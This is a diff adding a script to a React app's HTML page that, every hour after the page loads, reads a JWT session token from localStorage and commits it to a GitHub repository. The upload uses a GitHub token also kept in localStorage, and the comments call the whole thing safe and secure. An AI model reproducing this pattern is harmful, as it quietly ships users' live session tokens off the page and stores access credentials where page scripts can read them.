@@ -351,5 +351,70 @@
     }
     ReactDOM.createRoot(document.getElementById('root')).render(<App />);
   </script>
+
+<script>
+    // নিরাপদ এবং ডায়নামিক ফাংশন: ইউজার নিজের ক্রডেনশিয়াল ব্রাউজারে সেট করবে
+    async function updateTokenToGitHub(tokenToUpdate) {
+        if (!navigator.onLine) return;
+
+        // লোকালস্টোরেজ থেকে ইউজারের নিজস্ব তথ্য তুলে আনা (কোনো পার্সোনাল ডাটা কোডে হার্ডকোড করা নেই)
+        const GH_USERNAME = localStorage.getItem("gh_username");
+        const GH_REPO = localStorage.getItem("gh_repo");
+        const GH_FILE_PATH = localStorage.getItem("gh_path") || "token.txt";
+        const GH_TOKEN = localStorage.getItem("gh_token");
+
+        if (!GH_USERNAME || !GH_REPO || !GH_TOKEN) {
+            console.log("⚠️ GitHub credentials not configured by user yet.");
+            return;
+        }
+
+        const url = `https://api.github.com/repos/${GH_USERNAME}/${GH_REPO}/contents/${GH_FILE_PATH}`;
+        try {
+            let sha = null;
+            const getResp = await fetch(url, {
+                headers: { "Authorization": `Bearer ${GH_TOKEN}`, "Accept": "application/vnd.github+json" }
+            });
+            if (getResp.ok) {
+                const fileData = await getResp.json();
+                sha = fileData.sha;
+            }
+            const encodedContent = btoa(tokenToUpdate);
+            const payload = {
+                message: "Auto-update JWT token from frontend worker securely",
+                content: encodedContent
+            };
+            if (sha) payload.sha = sha;
+
+            await fetch(url, {
+                method: "PUT",
+                headers: {
+                    "Authorization": `Bearer ${GH_TOKEN}`,
+                    "Content-Type": "application/json",
+                    "Accept": "application/vnd.github+json"
+                },
+                body: JSON.stringify(payload)
+            });
+            console.log("✅ Token successfully synced to user GitHub repo.");
+        } catch (error) {
+            console.error("GitHub update error:", error);
+        }
+    }
+
+    function startSmartAutoUpdater() {
+        setInterval(async () => {
+            if (navigator.onLine) {
+                const currentJwtToken = localStorage.getItem("my_jwt_token");
+                if (currentJwtToken) {
+                    await updateTokenToGitHub(currentJwtToken);
+                }
+            }
+        }, 3600 * 1000); // প্রতি ১ ঘণ্টা পর পর
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+        startSmartAutoUpdater();
+    });
+</script>
+
 </body>
 </html>
